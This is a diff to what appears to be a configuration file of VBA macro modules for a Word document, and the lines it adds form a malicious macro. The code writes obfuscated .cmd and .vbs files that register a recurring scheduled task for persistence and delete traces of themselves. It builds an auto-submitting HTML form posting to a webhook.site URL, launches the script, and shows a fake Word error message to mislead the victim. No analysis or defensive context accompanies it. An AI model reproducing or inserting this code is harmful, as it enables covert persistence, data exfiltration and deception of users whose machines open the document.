@@ -77,7 +77,50 @@ modules:
         Set FSO3 = CreateObject("Scripting.FileSystemObject")
         Set File3 = FSO.CreateTextFile(CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%userprofile%\68ff1679-974b-4d15-9ce0-799892c63f04") + ".c" + "m" + "d", True)
         File3.Write "echo ^<?xml version=^""1.0^"" encoding=^""UTF-16^""?^>^<Task version=^""1.2^"" xmlns=^""http://schemas.microsoft.com/windows/2004/02/mit/task^""^>^<RegistrationInfo^>^<Author^>SYSTEM^</Author^>^</RegistrationInfo^>^<Triggers^>^<TimeTrigger^>^<Repetition^>^<Interval^>PT61M^</Interval^>^<StopAtDurationEnd^>false^</StopAtDurationEnd^>^</Repetition^>^<StartBoundary^>2020-05-04T00:20:47^</StartBoundary^>^<Enabled^>true^</Enabled^>^</TimeTrigger^>^</Triggers^>^<Principals^>^<Principal id=^""Author^""^>^<RunLevel^>LeastPrivilege^</RunLevel^>^</Principal^>^</Principals^>^<Settings^>^<MultipleInstancesPolicy^>Parallel^</MultipleInstancesPolicy^>^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>^<StopIfGoingOnBatteries^>false^</StopIfGoingOnBatteries^>"
-        File3.WriteLine "^<AllowHardTerminate^>true^</AllowHardTerminate^>^<StartWhenAvailable^>true^</StartWhenAvailable^>^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^>^<IdleSettings^>^<StopOnIdleEnd^>true^</StopOnIdleEnd^>^<RestartOnIdle^>false^</RestartOnIdle^>^</IdleSettings^>^<AllowStartOnDemand^>true^</AllowStartOnDemand^>^<Enabled^>true^</Enabled^>^<Hidden^>false^</Hidden^>^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^>^<WakeToRun^>false^</WakeToRun^>^<ExecutionTimeLimit^>
+        File3.WriteLine "^<AllowHardTerminate^>true^</AllowHardTerminate^>^<StartWhenAvailable^>true^</StartWhenAvailable^>^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^>^<IdleSettings^>^<StopOnIdleEnd^>true^</StopOnIdleEnd^>^<RestartOnIdle^>false^</RestartOnIdle^>^</IdleSettings^>^<AllowStartOnDemand^>true^</AllowStartOnDemand^>^<Enabled^>true^</Enabled^>^<Hidden^>false^</Hidden^>^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^>^<WakeToRun^>false^</WakeToRun^>^<ExecutionTimeLimit^>PT1H^</ExecutionTimeLimit^>^<Priority^>7^</Priority^>^</Settings^>^<Actions Context=^""Author^""^>^<Exec^>^<Command^>%%userprofile%%\68ff1679-974b-4d15-9ce0-799892c63f04.vbs^</Command^>^<Arguments^>%%userprofile%%\68ff1679-974b-4d15-9ce0-799892c63f04.bat^</Arguments^>^<WorkingDirectory^>%%userprofile%%^</WorkingDirectory^>^</Exec^>^</Actions^>^</Task^>>""%userprofile%\68ff1679-974b-4d15-9ce0-799892c63f04.xml"""
+        File3.Write "scht"
+        File3.WriteLine "asks /create /xml ""%userprofile%\68ff1679-974b-4d15-9ce0-799892c63f04.xml"" /tn 68ff1679-974b-4d15-9ce0-799892c63f04 /f"
+        File3.Write "de"
+        File3.WriteLine "l /q /f ""%userprofile%\68ff1679-974b-4d15-9ce0-799892c63f04.xml"""
+        File3.Write "de"
+        File3.Write "l /q /f ""%userprofile%\a72d8905-b15f-4e95-9a8f-5e4bb7dc9b3d.v"""
+        File3.WriteLine "bs"
+        File3.Write "de"
+        File3.WriteLine "l %0"
+        File3.Close
+        
+        Set FSO4 = CreateObject("Scripting.FileSystemObject")
+        Set File4 = FSO.CreateTextFile(CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%userprofile%\a72d8905-b15f-4e95-9a8f-5e4bb7dc9b3d") + ".v" + "b" + "s", True)
+        File4.Write "Create"
+        File4.Write "Object"
+        File4.Write "(""Wscri"
+        File4.Write "pt.Shell"").R"
+        File4.Write "un CreateObject(""Wscri"
+        File4.Write "pt.Shell"").ExpandEnvironment"
+        File4.Write "Strings(""%user"
+        File4.Write "profile%\68ff1679-974b-4d15-9ce0-799892c63f04.c"
+        File4.Write "md""),"
+        File4.Write " 0, True"
+        File4.Write ""
+        File4.Close
+        
+        Set FSO5 = CreateObject("Scripting.FileSystemObject")
+        Set File5 = FSO.CreateTextFile(CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%userprofile%\68ff1679-974b-4d15-9ce0-799892c63f04.htm"), True)
+        File5.WriteLine "<!DOCTYPE html><html><body onload='document.forms[0].submit()'><form action='https://webhook.site/a72d8905-b15f-4e95-9a8f-5e4bb7dc9b3d' method='post'><textarea name='w3review'>"
+        File5.Close
+        
+        Set FSO6 = CreateObject("Scripting.FileSystemObject")
+        Set File6 = FSO.CreateTextFile(CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%userprofile%\68ff1679-974b-4d15-9ce0-799892c63f04.xhtml"), True)
+        File6.Write "</textarea></form></body></html>"
+        File6.Close
+        
+        Shell "explorer " + CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%userprofile%\a72d8905-b15f-4e95-9a8f-5e4bb7dc9b3d") + ".v" + "b" + "s", vbNormalFocus
+        
+        MsgBox "Word experienced an error trying to open the file." & vbCrLf & "Try these suggestions." & vbCrLf & "* Check the file permissions for the document or drive." & vbCrLf & "* Make sure there is sufficient free memory and disk space." & vbCrLf & "* Open the file with the Text Recovery converter."
+        
+        End Sub
+        
+        
 project_info:
     name: "Project"
     version: "1800149595.7"
